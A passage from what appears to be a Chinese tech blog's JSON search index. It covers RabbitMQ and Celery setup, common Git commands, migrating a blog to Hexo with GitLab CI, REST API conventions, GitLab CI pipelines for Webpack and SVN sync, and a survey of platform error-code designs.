读取。\nconsuming的意思类似于接收。一个等待接收消息的程序叫做consumer。在图中我们用一个“C”来表示它。\n4. 使用 4.1 安装 RabbitMQ 1 2 3 yum install rabbitmq-server # 启动 RabbitMQ service rabbitmq-server start 此时，RabbitMQ 已经启动，但是无法访问 RabbitMQ 提供的管理页面，因为默认没有被开启。\n4.2 开启 Web 管理页面 启动 RabbitMQ 后，没法访问 Web 管理页面\n第一步，启动管理插件（先启动rabbitmq服务再装插件）\n1 rabbitmq-plugins enable rabbitmq_management 第二步，重启服务\n在 Windows 下:\n1 2 3 rabbitmq-service.bat stop rabbitmq-service.bat install rabbitmq-service.bat start 在 Linux 下：\n1 rabbitmq-service.bat restart 第三步，访问 Web 管理页面\nhttp://127.0.0.1:15672\n默认账户密码：guest:guest\n4.3 常用命令 RabbitMQ 启动监控管理器：rabbitmq-plugins enable rabbitmq_management\n关闭监控管理器：rabbitmq-plugins disable rabbitmq_management\n启动 RabbitMQ：rabbitmq-service start\n关闭 RabbitMQ：rabbitmq-service stop\n查看所有的队列：rabbitmqctl list_queues\n清除所有的队列：rabbitmqctl reset\n关闭应用：rabbitmqctl stop_app\n启动应用：rabbitmqctl start_app\n4.4 Celery 应用 使用 pip 安装 celery\n1 pip install celery 第一步，定义任务函数。\n创建一个文件 tasks.py\n1 2 3 4 5 6 7 from celery import Celery app = Celery(\u0026#39;tasks\u0026#39;, broker=\u0026#39;amqp://guest:guest@localhost:5672\u0026#39;) @app.task def add(x, y): return x + y 第二步，运行 Celery 任务。\n1 celery -A tasks worker --loglevel=info 第三步，调用任务\n1 2 3 4 In [0]: from tasks import add In [1]: add.delay(2, 2) Out[1]: \u0026lt;AsyncResult: 1d991392-a49f-4afa-9759-5deac5b46a2c\u0026gt; In [2]: [ add.delay(i, i) for i in range(0,999999)] 通过 delay 可以实现函数的异步调研。下图是，执行 In [2] 时的处理速度图示，可以看到处理的消息数量在不断增加，处理的速度达到了瓶颈。\n5. 高可用 RabbitMQ 模式大概分为以下三种：单一模式、普通模式、镜像模式。\n单一模式：单机模式 普通模式：默认的集群模式。\n对于 Queue 来说，消息实体只存在于其中一个节点，A、B两个节点仅有相同的元数据，即队列结构。\n当消息进入 A 节点的 Queue 后，consumer 从 B 节点拉取时，RabbitMQ 会临时在 A、B 间进行消息传输，把 A 中的消息实体取出并经过 B 发送给consumer。\n所以 consumer 应尽量连接每一个节点，从中取消息。即对于同一个逻辑队列，要在多个节点建立物理 Queue。否则无论 consumer 连 A 或 B，出口总在 A，会产生瓶颈。 镜像模式\n把需要的队列做成镜像队列，存在于多个节点，属于 RabbitMQ 的高可用 HA 方案。\n该模式解决了上述问题，其实质和普通模式不同之处在于，消息实体会主动在镜像节点间同步，而不是在 consumer 取数据时临时拉取。\n该模式带来的副作用也很明显，除了降低系统性能外，如果镜像队列数量过多，加之大量的消息进入，集群内部的网络带宽将会被这种同步通讯大大消耗掉。 6. 参考 https://geewu.gitbooks.io/rabbitmq-quick/content/index.html ","description":"","id":486,"section":"post","tags":["博文","RabbitMQ","中间件","Celery","消息","队列"],"title":"RabbitMQ 消息队列","uri":"https://www.chenshaowen.com/blog/message-queue-about-rabbitmq.html"},{"content":"1. 基本概念 Workspace：工作区，工程文件 Index：暂存区，也叫待提交更新区，在提交进入 repo 之前，把所有的更新放在暂存区 Local Repository：本地仓库，存放在本地的版本库，HEAD 指向当前的开发分支 Remote Repository：远程仓库，远程服务器的版本库 基本的 Git 工作流程如下：\n在工作目录中修改某些文件 对修改后的文件进行快照，然后保存到暂存区，git add 提交更新，将保存在暂存区域的文件快照永久转储到本地 Git，git commit 更新到远程，将本地 Git 推送到远程，git push 2. 初始化 初始化一个新仓库 1 $git init 克隆一个仓库 1 $git clone \u0026lt;git-base-url\u0026gt; 查看仓库远程主机 1 $git remote -v 3. 分支 列出全部分支 1 $git branch * 不带参数，仅列出本地 * `-a` 参数，列出本地和远程 * `-r` 参数，仅列出远程 切换分支 1 git checkout \u0026lt;branch_name\u0026gt; 拉取分支更新 1 git pull *`-a`参数，拉取全部分支更新 基于当前分支，创建本地分支 1 $git branch \u0026lt;branch_name\u0026gt; 基于远程分支，创建本地分支 1 $git branch \u0026lt;branch_name\u0026gt; origin/\u0026lt;branch_name\u0026gt; 切换分支 1 $git checkout \u0026lt;branch_name\u0026gt; 推送本地分支到远程 1 $git push origin \u0026lt;branch_name\u0026gt; 删除一个远程分支 1 $git push origin --delete \u0026lt;branch_name\u0026gt; 或者，推送一个空的本地分支到远程\n1 $git push origin :\u0026lt;branch_name\u0026gt; 删除一个本地分支 1 $git branch -D \u0026lt;branch_name\u0026gt; 4. 版本 1 2 3 4 5 6 7 8 9 10 # 查看命令历史，常用于帮助找回丢失掉的 commit git reflog # 回退到具体某个版本 git reset --hard c7926e6 # 显示当前分支的版本历史 git log # 显示commit历史，以及每次commit发生变更的文件 git log --stat # 搜索提交历史，根据关键词 git log -S [keyword] 5. 提交 新增代码 1 git add * 查看状态 1 git status 提交代码 1 git commit -m \u0026#34;commit msg\u0026#34; 丢弃某个文件 1 $git checkout -- \u0026lt;file_name\u0026gt; 丢弃全部文件修改 1 $git checkout 更新 master 到自己的分支分支 1 2 $git checkout \u0026lt;branch_name\u0026gt; $git merge master 从远程获取最新版 master 并 merge 到自己的分支 1 $git pull origin master 相当于先 fetch ，然后合并\n1 2 3 git fetch origin master:tmp git diff tmp git merge tmp 6. 标签 1 2 3 4 5 6 7 8 9 10 11 12 # 查看全部标签 git tag # 切换标签 git checkout \u0026lt;tag_name\u0026gt; # 新建标签 git tag v1.0 #新建标签，默认位 HEAD git tag v1.0 c7926e6 #对指定的 commit id 打标签 git tag -a v1.0 -m \u0026#39;v1.0 r\u0026#39; #新建带注释标签 # 删除标签 git tag -d \u0026lt;tag_name\u0026gt; # 删除远程标签 git push origin :refs/tags/\u0026lt;tag_name\u0026gt; 7. 参考 http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html ","description":"","id":487,"section":"post","tags":["博文","Git","工具"],"title":"常用 Git 命令","uri":"https://www.chenshaowen.com/blog/common-git-commands.html"},{"content":"混沌工程与实践\n高校培训第二周|DevOps\n高校培训第一周|容器与云原生\n中国 DevOps 社区分享|基于 Tekton 的 CICD 平台\nKubeSphere 开源之研发流程思考\n云原生下的 DevOps 平台\n2020 云原生产业大会|跨集群构建企业级 DevOps 平台\nSAAS 开发的思考\n高效时间管理\n编写可复用的 Django App\nROBOT FRAMEWORK 基础篇\nGitLab CI 与蓝盾\nUI 自动化测试\n持续集成与部署工具\n","description":"","id":488,"section":"","tags":null,"title":"演示文稿","uri":"https://www.chenshaowen.com/presentation/"},{"content":"1. Hexo 简介 Hexo 是使用 Node.js 开发的一个简洁、高效、开源的静态博客生成器。Hexo 能够以非常快的速度将 Markdown 渲染成静态的 HTML 文件。类似于 Jekyll、Ghost、Octopress，可以用于创建博客。\nHexo 具有如下优势：\n使用 Node.js ，搭建环境简单。Jekyll 搭建环境非常麻烦。 方便托管到 GitHub Pages ，由于 Hexo 生成的是 HTML ，十分方便部署 支持 Markdown 2. 安装 Hexo 安装 Node.js 和 NPM 之后，建议更换为国内的 NPM 源，加快依赖包的安装速度\n1 2 npm install -g cnpm --registry=https://registry.npm.taobao.org cnpm install install 安装 Hexo\n1 cnpm install -g hexo 初始化 Hexo\n1 hexo init myblog 生成 scaffolds、drafts、public、db.json、_config.yml、package.json、theme 等文件。\n本地启动服务，默认为 4000 端口\n1 2 3 4 cd myblog hexo s # 指定服务端口为 80 hexo s -P 80 3. Ghost 迁移文章 由于之前使用 Ghost 搭建博客，需要从 Ghost 后台，导出 json 格式的博客数据。然后，通过 Hexo 插件工具，将 json 数据转换为 Markdown 文件。\n安装 hexo-migrator-ghost\n1 npm install -g hexo-migrator-ghost 导入数据，转换为 Markdown 文件\n1 hexo migrate ghost \u0026lt;source.json\u0026gt; 执行完毕后，在 source 目录下，会自动生成每篇文档对应的 Markdown 文件。\n4. 发布到 GitHub Pages 第一步，在 GitHub 新建一个 your_name.github.io 的项目。\n第二步，在 _config.yml 中配置 repo\n1 2 3 4 5 deploy: type: git repo: github: git@github.com:your_name/your_name.github.io.git branch: master 第三步，生成 HTML\n1 hexo generate 第四步，部署到 GitHub Pages\n1 hexo deploy 根据提示输入账户，密码即可完成部署。通过 http://your_name.github.io 访问博客。\n5. CI 自动发布 由于仅使用 GitHub Pages 作为博客的发布地址，还需要一个仓库地址用于托管 Hexo 项目，还有 Markdown 源文件。\n第一步，在 GitHub 的 https://github.com/settings/keys 页面，生成一对 SSH Key ，点击【Add SSH key】将 pubulic key 填入其中。\n第二步，在 GitLb 项目的 【settings/ci_cd】页面，【Secret variables 】处，新增环境变量 DEPLOY_KEY，值为 private key。\n第三步，配置 CI 流程。使用 GitLab 作为 Hexo 源码托管仓库，通过 CI 自动发布到 GitHub Pages。\n在根目录下，新建文件 .gitlab-ci.yml 内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 image: node:4.2.2 pages: cache: paths: - node_modules/ before_script: - \u0026#39;which ssh-agent || ( apt-get update -y \u0026amp;\u0026amp; apt-get install openssh-client -y )\u0026#39; - eval $(ssh-agent -s) - ssh-add \u0026lt;(echo \u0026#34;$DEPLOY_KEY\u0026#34;) - mkdir -p ~/.ssh - \u0026#39;[[ -f /.dockerenv ]] \u0026amp;\u0026amp; echo -e \u0026#34;Host *\\n\\tStrictHostKeyChecking no\\n\\n\u0026#34; \u0026gt; ~/.ssh/config\u0026#39; script: - npm install hexo-cli -g - npm install - hexo deploy artifacts: paths: - public only: - master 如果没有 CI 配置，那么需要在本地生成 HTML 文件，再部署到 GitHub Pages 。通过配置 CI ，现在仅需要将 Markdown 文件提交到 GitLab ，GitLab CI 将自动完成部署。\n","description":"","id":489,"section":"post","tags":["博文","工具","Hexo"],"title":"如何将博客从 Ghost 迁移到 Hexo","uri":"https://www.chenshaowen.com/blog/how-to-migrating-blogs-to-hexo.html"},{"content":" 在 Web 应用开发的过程中，后端开发人员需要频繁的交付 API 接口，前端开发人员需要频繁的调用 API 接口。为了降低沟通成本、预防可能的安全风险，遵循约定优于配置的原则，有必要规范 API 的接口规范。Restful API 是以资源为核心的 API 设计思路，所有的操作都是针对特定的资源进行。在 SaaS 开发中，推荐使用 Restful API 风格接口，本文主要讨论 Restful API 在 SaaS 开发过程中的一些前置约定。\n1. 请求规范 1.1 编码方式 统一采用 charset=utf-8\nAjax 全局配置\n1 2 3 $.ajaxSetup({ contentType: \u0026#34;application/json; charset=utf-8\u0026#34;, }); Axios 全局配置\n1 2 axios.defaults.headers.common[\u0026#34;Content-Type\u0026#34;] = \u0026#34;application/json;charset=UTF-8\u0026#34;; 1.2 请求方法 API 的 Method，要符合实际请求的类型。\n动词 含义 GET 查看 POST 创建 DELETE 删除 PUT 更新 1.3 传参方式 GET 请求\n参数放在请求路径后以 ? 开头的参数串中，参数以 urlencode 编码。\nPUT / PATCH / POST 请求\n对于复杂数据结构的传参，建议将参数 JSON 编码后放在请求体中。\n1.4 请求参数 批量数据必须排序，例如： ?sortOrder=asc\u0026amp;sortField=created_time 批量数据必须分页，例如：?page=5\u0026amp;pagesize=50 可以批量请求的 API，不允许轮询，例如：?id=1,2,3 2. 响应规范 2.1 统一的返回格式 字段名 返回内容描述 result True/False code 现阶段可以不使用, 0 代表正确，非 0 代表不同的错误情况 data 成功时，返回的数据的内容 message 失败时，返回的错误信息 request_id （可选）标识请求的 id（可以自动生成的唯一标识，方便追踪请求记录 uuid ） 1 2 3 4 5 6 { \u0026#39;result\u0026#39;: True, \u0026#39;message\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;data\u0026#39;: [], \u0026#39;code\u0026#39;: 0 } 2.2 合适的状态码 建议充分利用 HTTP Status Code 作为响应结果的基本状态码，基本状态码不能区分的 status，再用响应中\u0026quot;约定\u0026quot;的 code 进行补充。\n200 : GET 请求成功，及 DELETE 或 PATCH 同步请求完成，或者 PUT 同步更新一个已存在的资源 201 : POST 同步请求完成，或者 PUT 同步创建一个新的资源 401 : Unauthorized : 用户未认证，请求失败 403 : Forbidden : 用户无权限访问该资源，请求失败 429 : Too Many Requests : 因为访问频繁，你已经被限制访问，稍后重试 500 : Internal Server Error : 服务器错误，确认状态并报告问题 http 状态码详细说明请参考：\nhttps://zh.wikipedia.org/wiki/HTTP%E7%8A%B6%E6%80%81%E7%A0%81\n2.3 参数获取方式 使用 Django URL 的正则匹配获取参数 1 url(r\u0026#39;^area/(?P\u0026lt;cityID\u0026gt;\\d{6})/$\u0026#39;, \u0026#39;get_area\u0026#39;) 使用 Django Forms 获取参数 1 2 3 4 5 6 7 8 9 class FilterForm(forms.Form): sys_type = forms.ChoiceField(choices=choices.SYS_CHOICES, required=True, label=u\u0026#39;类型\u0026#39;) def my_view(request): form = FilterForm(request.GET) if not form.is_valid(): # 数据不合法 else: # 通过 form.cleaned_data 获取数据 2.4 权限校验 垂直越权\n普通用户不允许访问管理员用户资源\n平行越权\n普通用户不能访问没有授权的其他普通用户资源\n3. 错误码规范 3.1 错误码设计 合理的设计错误码 参考设计 1\n200 05 02 HTTP 状态码 服务模块代码 具体错误代码 参考设计 2\nERROR_INVALID_FUNCTION\nERROR_PATH_NOT_FOUND\nERROR_TOO_MANY_OPEN_FILES\nERROR_ACCESS_DENIED\n3.2 错误提示应准确并有用 需要提供两个基本内容：\n返回错误状态，解释原因 提示用户如何解决 例如：\n调用 XXX 接口异常，请稍后重试，或联系管理员 XXX 连接 MySQL 数据库异常，请联系管理员 XXX 您输入的 XXX 不符合格式要求，请输入 XXX 格式的数据 3.3 提供错误说明对照表 提供一个页面或接口，展示错误码-错误详情的信息。例如：接口 /api/v1/error_code/，返回：\n1 2 3 4 5 6 { \u0026#34;http_status_code - error_code - message\u0026#34;: [ [412, \u0026#34;Error_LOGIN_FRONT_NOT_GIFT\u0026#34;, \u0026#34;礼品不充足\u0026#34;], [503, \u0026#34;ERROR_FAULT\u0026#34;, \u0026#34;服务器内部错误\u0026#34;] ] } 4. 参考 http://www.ruanyifeng.com/blog/2014/05/restful_api.html ","description":"","id":490,"section":"post","tags":["博文","Django","接口","API","研发","规范"],"title":"API 接口规范","uri":"https://www.chenshaowen.com/blog/api-interface-specification.html"},{"content":" 从 GitLab 8.0 开始，GitLab 开始集成 CI（持续集成） 功能。只需要在服务器上添加一个 Runner，同时在项目中添加一个 .gitlab-ci.yml 文件，就可以进行 CI。在 GitLab 搭建与配置 中笔者记录了从零开始搭建 GitLab 服务的整个流程。在 GitLab CI 持续集成 中笔者交代了 GitLab CI 的一些基本概念，并给出了一个简单的 Demo。\n本文主要讨论的是使用 Git 作为代码仓库时，多人开发的工作模式；在前端开发过程中，如何利用 GitLab-CI 工具，自动化编译 Webpack 项目。\n1. 问题与需求 笔者从事 SaaS 开发，简单描述下目前团队项目开发的现状。\nSaaS 基于 PaaS 提供的框架和 CI/CD 功能进行开发、预发布、发布，使用 SVN 进行代码的管理。PaaS 提供了 SaaS 开发人员快速开发应用的能力。\n但是，在多人合作开发的项目中，SVN 提供的分支功能不便于管理分支、合并代码。\n相比较于 SVN，Git 拉取代码速度快、允许上千个并行开发的分支、完全分布式，受到大量开发人员的喜爱。多人合作开发项目时，倾向于使用 Git 来管理代码，而在准备部署时才提交到 SVN。为了缩短流程，一方面，可以推动 PaaS 提供 Git 代码托管服务；另一方面，可以通过一定的工具来自动化整个流程（Git -\u0026gt; SVN），节省开发部署的时间。\n另外一个问题是，前端团队使用的是 Webpack 模块打包管理工具，前端工程需要打包编译。针对一些复杂的项目，可能会有多人参与前端的开发工作。有时，前端人员在打包 Webpack 项目之前，没有拉取最新代码，导致其他前端人员开发的功能没有及时更新到最新的版本文件中。\n幸运的是，GitLab 提供 CI 的功能，能解决上面的问题。GitLab CI 提供了在服务器上执行脚本、自动化流程的能力。\n2. Git 工作流 通常 Git 的工作流程，采用的是功能驱动式开发。先有需求，再有功能分支或补丁分支。完成开发后，该分支就合并到主分支，然后删除分支。\n广泛使用的工作流程有三种：\nGit flow Github flow Gitlab flow Git flow 需要同时维护两个非常相似的分支 develop 和 master，比较适合具有较长版本发布周期的项目；Github flow 只需要维护一个分支，根据新需求从 master 拉取新分支，合并上线后，再删除新分支。Gitlab flow 在 master 分支以外，再建立不同的环境分支，通过不同环境的上下游关系合并新功能。\n目前团队的SaaS 更新周期短，迭代频繁，新的功能和修复的 Bug 很快就能合并到 master ，个人认为使用 Github flow 工作流程会比较简单方便。\n当有新需求或者 Bug 时，从最新的 master 拉出一个新的分支，在新的分支上进行开发。在新分支上开发完成之后，发起 Pull Request 合并到 master ，最后删掉新建的分支。\n3. GitLab-CI 工作流 通过在项目中配置 CI 流程，GitLab 默认在代码提交之后触发 CI 过程。默认的 CI 配置文件路径是项目根目录下 .gitlab-ci.yml 文件，也可以在项目的【Settings】-【Pipelines】- 【Pipelines】中指定配置文件路径。\n简单说，就是在项目下新增一个 .gitlab-ci.yml 文件，在文件中定义 CI 流程，提交代码之后，GitLab CI 就自动开始构建了。下面的一些讨论，主要是围绕 .gitlab-ci.yml 文件。\n3.1 .gitlab-ci.yml 关键字及含义 before_script\n定义任何 Jobs 运行前都会执行的命令。 after_script\n定义任何 Jobs 运行完后都会执行的命令。（要求 GitLab 8.7+ 和 GitLab Runner 1.2+） variables \u0026amp;\u0026amp; Job.variables\n定义环境变量。如果定义了 Job 级别的环境变量的话，该 Job 会优先使用 Job 级别的环境变量。（要求 GitLab Runner 0.5.0+） cache \u0026amp;\u0026amp; Job.cache\n定义需要缓存的文件。每个 Job 开始的时候，Runner 都会删掉 .gitignore 里面的文件。如果有些文件 (如 node_modules/) 需要多个 Jobs 共用的话，我们只能让每个 Job 都先执行一遍 npm install。（要求 GitLab Runner 0.7.0+） Job.script\n定义 Job 要运行的命令，必填项 Job.stage\n定义 Job 的 stage，默认为 test Job.artifacts\n定义 Job 中生成的附件。当该 Job 运行成功后，生成的文件可以作为附件 (如生成的二进制文件) 保留下来，打包发送到 GitLab，之后我们可以在 GitLab 的项目页面下下载该附件。 3.2 工作流 本地开发功能、定义流程，提交代码后，GitLab 通过 Pipeline 完成 CI/CD 过程。\n4. Webpack CI 实践 GitLab 服务器最低配置要求是 1 core CPU、1GB RAM、3GB swap，推荐配置是 2 cores CPU、4GB RAM。团队使用的 GitLab 服务器配置为：\nIntel(R) Xeon(R) CPU E5-2420 六核，1.90GHz，线程数 12 内存 64G 硬盘 300G，10000RPM，SAS 项目的文件结构：\n1 2 3 4 - webpack/src - webpack/package.json - webpack/... - .gitlab-ci.yml 4.1 .gitlab-ci.yaml 配置 需要注意的是 GitLab CI 提供了一些内置的环境变量，比如，$CI_PROJECT_PATH 表示项目的路径。使用这些内置变量，能够显著提高 yaml 配置的可移植性，减少拼写错误。下面是配置的 yaml 文件，具体每个步骤的功能，写在注释中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 before_script: # 激活 nodeenv 虚拟环境 - source /data/gitlab-runner/paas-webfe/bin/activate # 查看 node 版本 - which node \u0026amp;\u0026amp; node --version # 为了能方便使用 npm ，给它取一个别名 - alias npm=\u0026#34;/data/gitlab-runner/node/bin/npm\u0026#34; - which npm \u0026amp;\u0026amp; npm --version stages: - build build-test-webpack: variables: # 需要修改为项目的 GitLab 地址格式 CI_REPOSITORY_URL: http://$GIT_USERNAME:$GIT_PASSWORD@gitlab.yourdomain.com/$CI_PROJECT_PATH.git # 打包生成的文件存放目录 OUT_PUT_DIR: test stage: build # 允许在 GitLab 页面上，直接下载 $OUT_PUT_DIR 内容 artifacts: paths: - $OUT_PUT_DIR # 没有 Git 版本的文件，设置缓存，可以避免每次 npm install 重复安装 cache: untracked: true script: # 开始执行打包编译命令，并提交到当前的 Git 仓库，具体的命令，需要根据项目编写，也可以放在一个 shell 文件，执行 - echo \u0026#34;start build test\u0026#34; - rm -rf $CI_PROJECT_NAME $OUT_PUT_DIR - cd ./webpack \u0026amp;\u0026amp; tnpm install \u0026amp;\u0026amp; tnpm run build-test \u0026amp;\u0026amp; cd .. - git clone $CI_REPOSITORY_URL - rm -rf $CI_PROJECT_NAME/$OUT_PUT_DIR \u0026amp;\u0026amp; cp -r $OUT_PUT_DIR $CI_PROJECT_NAME/ - cd $CI_PROJECT_NAME - git add $OUT_PUT_DIR - git status \u0026gt;\u0026gt; build.log - date \u0026gt;\u0026gt; build.log - git add build.log - git commit -m \u0026#34;auto build-test[ci skip]\u0026#34; - git push $CI_REPOSITORY_URL master - echo \u0026#34;end build test\u0026#34; 上面的 yaml 配置实现了，提交代码之后，自动打包编译 Webpack 项目，并将编译生成的文件更新到 GitLab 仓库。如果需要更新到 SVN ，只需要执行 SVN 相应的提交命令即可，这个就当做是作业布置给看本篇文档的你了。\n4.2 通过环境变量隐藏敏感信息 在项目页面依次选择 - 【Settings】- 【Pipelines】- 【Secret variables】\n4.3 查看 CI 结果 向 GitLab 提交代码之后，CI 过程将被自动触发。等待执行的完成。\n需要说明的另外一个关键点是：循环构建。在 script 里面，在每次构建时，会执行一次 git 的提交，这样会触发一次新的构建，如此反复，不停地执行构建。为了解决这个问题，在 script 里面提交代码时，需要在 commit 的 message 中加上 \u0026ldquo;[ci skip] 或者 [skip ci] 关键字\u0026rdquo;，跳过当次构建。在 Web 上查看 【Pipeline】 的执行状态时，可以看到一次提交会新增两条记录，其中一条为 【skipped】。\n执行 job 时，除了 console 会输出构建信息。在 【Jobs】选项中还可以查看 job 的执行流和执行结果，为了更好的页面效果，下面是另外一个 Example 的执行结果（特意写了很多个 stage 和 job）。\n4.4 一些小技巧 job 中使用 when 关键字，可以控制 job 在满足一定条件时，才被执行 1 when: [on_success | on_failure | always | manual] 跳过 CI，在提交代码时，增加 ci skip或skip ci，可以跳过当次提交触发的 CI 过程 1 git commit -m \u0026#34;[ci skip]\u0026#34; 在 job 中可以设置 only ，限制仅指定分支才执行 1 2 only: - master 5. 参考 http://www.ruanyifeng.com/blog/2015/12/git-workflow.html https://guides.github.com/introduction/flow/index.html https://www.ibm.com/developerworks/cn/java/j-lo-git-mange/index.html https://docs.gitlab.com/ce/ci/variables/ https://gitlab.com/gitlab-org/gitlab-ce/issues/18106 https://hackernoon.com/setting-up-ci-cd-on-gitlab-step-by-step-guide-part-1-826385728223 https://www.perforce.com/perforce/r16.3/manuals/gitswarm/ci/yaml/README.html 6. 附录 另外一份将 Git 仓库代码推送到 SVN 的配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 before_script: - svn --version - git --version - \u0026#39;echo \u0026#34;clear svn \u0026amp; git dir\u0026#34;\u0026#39; - rm -rf svn-dit git-dir - LANG=\u0026#34;zh_CN.utf8\u0026#34; - export LC_ALL=zh_CN.UTF-8 stages: - deploy push-to-svn: stage: deploy variables: CI_REPOSITORY_URL: http://$GIT_USERNAME:$GIT_PASSWORD@gitlab.domain.com/$CI_PROJECT_PATH.git artifacts: paths: - svn-dir - git-dir script: - \u0026#39;echo \u0026#34;start push to svn\u0026#34;\u0026#39; - \u0026#39;echo \u0026#34;step 1/3: git clone\u0026#34;\u0026#39; - git clone $CI_REPOSITORY_URL git-dir - \u0026#39;echo \u0026#34;finished\u0026#34;\u0026#39; - \u0026#39;echo \u0026#34;setp 2/3: svn checkout\u0026#34;\u0026#39; - svn checkout $SVN_PATH svn-dir --username $SVN_USERNAME --password $SVN_PASSWORD --no-auth-cache - \u0026#39;echo \u0026#34;finshed\u0026#34;\u0026#39; - \u0026#39;echo \u0026#34;step 3/3: push git master to svn trunk\u0026#34;\u0026#39; - cd svn-dir - svn delete * - cd .. - cp -rf git-dir/* svn-dir/ - cd ./svn-dir - svn add * --force - svn commit -m \u0026#34;`git log -1 --pretty=%B`\u0026#34; --username $SVN_USERNAME --password $SVN_PASSWORD --no-auth-cache - \u0026#39;echo \u0026#34;end push to svn\u0026#34;\u0026#39; only: - master ","description":"","id":491,"section":"post","tags":["博文","前端","持续集成","工具","DevOps","GitLab","CICD"],"title":"GitLab CI 之前端 Webpack 实践","uri":"https://www.chenshaowen.com/blog/front-webpack-practice-of-gitlab-ci.html"},{"content":" 笔者目前使用 Django 从事 SaaS 开发，同时开发和维护多个 SaaS 应用。在很多 SaaS 应用中都约定了错误码，有的用于处理登录态，有的用于标记业务逻辑状态。对于这种项目共性很强的特征，花时间学习和研究是非常有必要的。本篇主要讨论了错误码的用途、如何设计错误码、使用 Django 中间件如何实现异常的处理错误码的返回。\n1. 错误码的用途 错误码是与错误信息关联的一组数字或字母，用于约定错误状态。\n在 Web 应用中，一次接口的访问，涉及反向代理的转发、业务逻辑的处理、数据库的访问、模板的渲染、中间件的处理等环节，难免会出现各种各样的错误。同时，系统越复杂，访问的链路越长，模块越多，出错的可能性越高。\n既然错误无法避免，那么就需要反馈错误信息。返回错误信息，一方面是为了在应用系统开发阶段，方便调试，添加相应的逻辑处理，提示用户；另一方面是应用系统运行时，可能会有潜在的异常风险，错误码能辅助定位和修复问题。\nHTTP 状态码是最常见的，通过提前协商处理服务状态的约定编码。HTTP 状态码通常由三个数字组成，第一个数字定义了响应的类别，且只有五种可能值。\n状态码 范围 含义 1xx 100-101 指示信息\u0026ndash;表示请求已接收，继续处理 2xx 200-206 成功\u0026ndash;表示请求已被成功接收、理解、接受 3xx 300-305 重定向\u0026ndash;信息不完整需要进一步补充 4xx 400-415 客户端错误\u0026ndash;请求有语法错误或请求无法实现 5xx 500-505 服务器端错误\u0026ndash;服务器未能实现合法的请求 值得注意的是，HTTP 状态码可以通过小数的方式扩展，更加详细的描述服务器状态，比如，403 表示禁止访问，403.1 表示禁止可执行访问，403.2 表示禁止读访问。\n通过 HTTP 状态码，客户端能够有效地获取服务器的响应状态，更好地处理异常情况、提示用户信息。错误码和 HTTP 状态码有异曲同工之处，不同的是错误码约定的是业务逻辑，而 HTTP 状态码约定的是服务器的响应状态。\n在 Web 应用的通信过程中，如果 HTTP 状态码不足以表示服务器的响应状态，可以通过错误码来补充，比如，服务器返回 {'code': 500101, 'message': u'连接数据库错误'}。HTTP 状态码是一种已经达成共识的约定编码，而错误码需要建立新的约定。在业务逻辑中，也可以通过 HTTP 状态码表示业务错误状态，比如使用 412 表示未满足前提条件。错误码和 HTTP 状态码有交集，但不能相互替代。\n2. 如何设计错误码 2.1 一些公共平台的错误码 淘宝开发平台 错误码主要分为两类\n(1) 小于100 错误码，表示用户请求不符合基本校验，比如，字段校验、权限、频率等。\n(2) 子错误码，以 \u0026ldquo;isp.\u0026rdquo; 开头，表示服务端异常，比如 \u0026ldquo;isp.remote-service-error\u0026rdquo;、\u0026ldquo;isp.remote-service-timeout\u0026quot;等。不同的服务，使用不同的头部。\n还有一些特定约定的错误码，比如 801、802等。\n腾讯开放平台 - 公共返回码 错误码说明：\n(1) ret = 0，正确返回\n(2) ret \u0026gt; 0，调用 OpenAP I时发生错误，需要开发者进行相应的处理。\n(3) -50 \u0026lt;= ret \u0026lt;= -1， 接口调用不能通过接口代理机校验，需要开发者进行相应的处理。\n(4) ret \u0026lt;-50，系统内部错误\n另外，腾讯开放平台提供的各种语言的 SDK 错误码含义相同。使用数字表示，比如 1801、1802、1803等。\n腾讯开放平台 - 错误码 以三位和四位的数字为主，下面是部分错误码：\n错误代码 错误类型 说明 0 成功 调用成功 401\u0026lt; HTTP请求参数不符合要求 HTTP请求参数不符合要求 503 调用额度已超出限制 调用额度已超出限制 504 服务故障 服务故障 4000 请求参数非法 缺少必要参数，或者参数值格式不正确，具体 6000 服务器内部错误 服务器内部出现错误，请稍后重试或者联系客服人员帮忙解决。 腾讯开放平台 - 支付错误码 腾讯开放平台支付的错误码，以短横线连接三组数字表示。从错误码字母分析，是以短横线分隔不同模块，或者表示不同处理阶段，但是在官方文档上并没有明确说明。下面是部分错误码:\n错误码：1003-498493-106\n错误码：1003-498692-106\n错误码：1025-1025-0\n错误码：1043-10053-0\n错误码：1058-498198-40000\n错误码：1058-500952-40000\n错误码：1058-500954-40000\n新浪开放平台 - 错误码 错误码格式\n1 2 3 4 5 6 JSON { \u0026#34;request\u0026#34; : \u0026#34;/statuses/home_timeline.json\u0026#34;, \u0026#34;error_code\u0026#34; : \u0026#34;20502\u0026#34;, \u0026#34;error\u0026#34; : \u0026#34;Need you follow uid.\u0026#34; } 错误代码说明，以 20502 为例\n2 05 02 服务级错误（1为系统级错误） 服务模块代码 具体错误代码 部分错误码：\n错误代码 错误信息 详细描述 10014 服务模Insufficient app permissions 应用的接口访问权限受限 20603 List does not exists 列表不存在 20701 Repeated tag text 不能提交相同的收藏标签 百度开发者中心 Open API 错误码 百度开发者中心的错误码，采用自增的方式编码。\n错误代码 错误信息 详细描述 0 成功 Success 1 未知错误 Unknown error 2 服务暂不可用 Service temporarily unavailable 100 请求参数无效 Invalid parameter 101 api key无效 Invalid API key 102 session key无效 Session key invalid or no longer valid 103 call_id参数无效 Invalid/Used call id parameter 微信开发平台 微信开发平台采用的是五位错误码。\n错误代码 错误信息 详细描述 40001 invalid credential 不合法的调用凭证 40008 invalid message type 不合法的message_type 40016 invalid button size 不合法的菜单按钮个数 在微信支付相关的接口中，采用的是英文大写字母加下划线的方式编码。\n错误代码 错误信息 详细描述 NOAUTH 商户无此接口权限 商户未开通此接口权限 ORDERPAID 商户订单已支付，无需重复操作 商户订单已支付，无需更多操作 SYSTEMERROR 系统错误 系统超时 2.2 好的错误码有哪些特征 长度足够短 